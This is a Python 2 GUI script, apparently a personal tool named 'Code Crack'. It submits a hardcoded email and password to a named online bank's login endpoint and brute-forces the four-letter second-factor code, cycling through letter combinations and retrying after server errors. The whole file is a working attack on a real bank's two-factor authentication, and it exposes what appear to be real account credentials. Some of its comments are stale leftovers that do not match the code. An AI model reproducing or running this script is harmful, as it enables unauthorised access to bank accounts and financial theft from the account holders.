#!/usr/bin/python
# -*- coding: UTF-8 -*-

'''
获取验证码
'''

import sys
import json
import time
import threading
import requests
from tkinter import *

class Scrapy():
    # 构造初始化环境
    def __init__(self):
        # 设置页面编码
        if sys.getdefaultencoding() != 'utf-8':
            reload(sys)
            sys.setdefaultencoding('utf-8')
        #创建窗体
        root = Tk(className="Code Crack")
        root.geometry('580x250')

        # 标签控件，显示文本和位图，展示在第一行
        Label(root, text="Try code").grid(row=0, sticky=W)  # 靠右
        Label(root, text="Try result").grid(row=1, sticky=W)  # 第二行，靠左
        Label(root, text="progress").grid(row=2, sticky=W)  # 第二行，靠左

        # 显示控件
        self.titleSet = ""#显示标题
        self.result = ""#显示翻译结果

        self.lab1=Label(root,width=32,text="waiting code",justify='left')
        self.lab1.grid(row=0, column=1, padx=10, pady=10)

        self.lab2=Label(root,width=32,text="waiting result",foreground='#32CD32',justify='center')
        self.lab2.grid(row=1, column=1)

        self.lab3=Label(root,width=32,text="0",foreground='#32CD32',justify='center')
        self.lab3.grid(row=2, column=1)


        label = Label(text="Code Crack")
        label.grid(row=0, column=2, rowspan=2, columnspan=2,
                   sticky=W + E + N + S, padx=5, pady=5)  # 合并两行，两列，居中，四周外延5个长度

        self.name = StringVar()
        self.name.set('la-corte-daniel@gmx.de')
        Label(root, text="username：").grid(row=3, sticky=W)  # 靠右
        username = Entry(root,width=30,textvariable=self.name)  # 输入框
        username.grid(row=3, column=1)


        self.pwd = StringVar()
        self.pwd.set('Passwort1!')
        Label(root, text="password：").grid(row=4, sticky=W)  # 靠右
        password = Entry(root,width=30,textvariable=self.pwd)  # 输入框
        password.grid(row=4, column=1)
        password['show'] = "*"  # 掩码


        # 按钮控件
        self.button1 = Button(root, text="start",width=8,command=self.start)
        self.button1.grid(row=5, rowspan=2,column=0,columnspan=2,sticky=N + S,padx=5,pady=50)
        self.button2 = Button(root, text="stop",width=8,command=self.stop)
        self.button2.grid(row=5, column=2,padx=0,pady=50,sticky=N + S)

        # 启动程序
        root.mainloop()

    def start(self):
        print "开启线程start"
        # self.button1['state']=DISABLED
        self.flag=True
        t = threading.Thread(target=self.job, args=(), name='thread-refresh')
        t.setDaemon(True)
        t.start()

    def stop(self):
        self.flag=False
        # self.button2['state'] = DISABLED

    # 爬取分页信息,商品房预售许可
    def job(self):
        print "获取数据name：",self.name.get()
        print "获取数据pwd：", self.pwd.get()
        #原始链接
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
            'Host': 'bank.mistertango.com',
            'Origin':'https://bank.mistertango.com',
            'Referer':'https://mistertango.com/en/'
        }
        url='https://bank.mistertango.com/en'
        session = requests.session();
        response=session.get(url,headers=headers,timeout=3600)
        print "...获取首页..."

        url='https://bank.mistertango.com/ajax/auth2'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
            'Host': 'bank.mistertango.com',
            'Origin':'https://bank.mistertango.com',
            'Referer':'https://bank.mistertango.com/en',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With':'XMLHttpRequest'
        }
        data={
            'username':self.name.get(),
            'password':self.pwd.get(),
            'captcha':'',
            'secret_2':'',
            'command':'authenticate'
        }
        chars = [
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
            'v', 'w',
            'x', 'y', 'z'
        ]

        notContains=['a','e','i','o','u'];
        base = len(chars)  # 62
        end = len(chars) ** 4
        count = 0;
        for i in range(0, end):
            if self.flag ==False:
                print "停止了.."
                break
            n = i
            ch0 = chars[n % base]
            n = n / base
            ch1 = chars[n % base]
            n = n / base
            ch2 = chars[n % base]
            n = n / base
            ch3 = chars[n % base]
            count += 1;
            code = str(ch3 + ch2 + ch1 + ch0)

            #特殊字符跳过，第1个和第3个不可能是aeiou
            if code[0] in notContains or code[2]  in notContains:
                self.lab3['text']=code+"跳过"
                continue

            #相邻字符不可能重复出现aabc
            if code[1]==code[0] or code[2]==code[1] or code[3]==code[2]:
                self.lab3['text']=code+"相邻重复跳过"
                continue

            print "正在尝试第%d个验证码：%s"%(count,code)
            data['secret_2']=code
            print "...开始尝试验证码,发送请求中..."
            try:
                response = session.post(url, headers=headers, data=data,timeout=3600)
                print response.text
                jsonResult=json.loads(response.text);
                result=jsonResult['status']
                print "尝试结果：",result
                self.lab1['text'] = code
                self.lab2['text'] = str(result)
                self.lab3['text'] = count
                if result !=False:
                    print "寻找到了验证码：",code
                    break
            except Exception,e:
                self.lab3['text'] = "服务器断开链接...重试中"
                print "服务器断开链接..."
                print "10秒后继续开始..."
                time.sleep(10);
                response = session.post(url, headers=headers, data=data,timeout=3600)
                print response.text
                jsonResult=json.loads(response.text);
                result=jsonResult['status']
                print "尝试结果：",result
                self.lab1['text'] = code
                self.lab2['text'] = str(result)
                self.lab3['text'] = count

                import webbrowser
                webbrowser.open(url)

                if result !=False:
                    print "寻找到了验证码：",code
                    self.lab1['text'] = code
                    break

if __name__ == '__main__':
    scrapy = Scrapy();
